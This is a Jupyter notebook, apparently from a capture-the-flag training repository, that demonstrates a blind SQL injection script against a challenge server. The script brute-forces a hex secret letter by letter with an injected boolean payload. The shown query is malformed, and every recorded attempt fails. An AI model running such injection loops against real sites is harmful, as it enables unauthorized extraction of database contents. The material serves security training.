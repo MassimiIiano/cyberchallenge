{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Blind injection expample"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Object to call the server to perform a blind injection attack."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "import binascii\n",
    "import time\n",
    "\n",
    "\n",
    "class Inj:\n",
    "    def __init__(self, host):\n",
    "\n",
    "        self.sess = requests.Session() # Start the session. We want to save the cookies\n",
    "        self.base_url = '{}/api/'.format(host)\n",
    "        self._refresh_csrf_token() # Refresh the ANTI-CSRF token\n",
    "\n",
    "    def _refresh_csrf_token(self):\n",
    "        resp = self.sess.get(self.base_url + 'get_token')\n",
    "        resp = resp.json()\n",
    "        self.token = resp['token']\n",
    "\n",
    "    def _do_raw_req(self, url, query):\n",
    "        headers = {'X-CSRFToken': self.token}\n",
    "        data = {'query': query }\n",
    "        return self.sess.post(url,json=data, headers=headers).json()\n",
    "\n",
    "    def logic(self, query):\n",
    "        url = self.base_url + 'logic'\n",
    "        response = self._do_raw_req(url, query)\n",
    "        return response['result'], response['sql_error']\n",
    "\n",
    "    def union(self, query):\n",
    "        url = self.base_url + 'union'\n",
    "        response = self._do_raw_req(url, query)\n",
    "        return response['result'], response['sql_error']\n",
    "\n",
    "    def blind(self, query):\n",
    "        url = self.base_url + 'blind'\n",
    "        response = self._do_raw_req(url, query)\n",
    "        return response['result'], response['sql_error']\n",
    "\n",
    "    def time(self, query):\n",
    "        url = self.base_url + 'time'\n",
    "        response = self._do_raw_req(url, query)\n",
    "        return response['result'], response['sql_error']"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Broute force the solution letter by letter"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying 0: Failure\n",
      "Trying 1: Failure\n",
      "Trying 2: Failure\n",
      "Trying 3: Failure\n",
      "Trying 4: Failure\n",
      "Trying 5: Failure\n",
      "Trying 6: Failure\n",
      "Trying 7: Failure\n",
      "Trying 8: Failure\n",
      "Trying 9: Failure\n",
      "Trying a: Failure\n",
      "Trying b: Failure\n",
      "Trying c: Failure\n",
      "Trying d: Failure\n",
      "Trying e: Failure\n",
      "Trying f: Failure\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "''"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\n",
    "# ... snippet di definizione della classe Inj\n",
    "\n",
    "inj = Inj('http://web-17.challs.olicyber.it/')\n",
    "\n",
    "dictionary = '0123456789abcdef'\n",
    "result = ''\n",
    "\n",
    "while True:\n",
    "    for c in dictionary:\n",
    "        question = f\"1' AND (SELECT 1 FROM SELECT * WHERE HEX(asecret) LIKE '{result+c}%')='1\"\n",
    "        response, error = inj.blind(question)\n",
    "        print(f\"Trying {result+c}: {response}\")\n",
    "        if response == 'Success': # We have a match!\n",
    "            result += c\n",
    "            break\n",
    "    else:\n",
    "        break # Yup, i cicli for in Python hanno una sezione else.\n",
    "              # Significa che abbiamo esaurito i caratteri del\n",
    "              # dizionario.\n",
    "\n",
    "result"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
